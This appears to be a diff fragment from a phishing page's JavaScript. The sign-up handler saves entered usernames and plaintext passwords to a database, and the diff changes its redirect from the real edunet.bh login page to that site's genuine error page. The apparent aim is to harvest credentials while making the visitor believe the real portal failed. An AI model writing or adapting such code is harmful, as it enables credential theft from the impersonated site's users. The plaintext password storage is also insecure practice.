@@ -13,7 +13,7 @@ signUpButton.addEventListener('click', function() {
         Pass: password,
     })
     .then((docRef) => {
-        window.location.href = "https://www.edunet.bh/Account/Login";
+        window.location.href = "https://www.edunet.bh/Error/SomethingWrong";
         console.log("user added");
         UsernameField.value = "";
         passwordField.value = "";
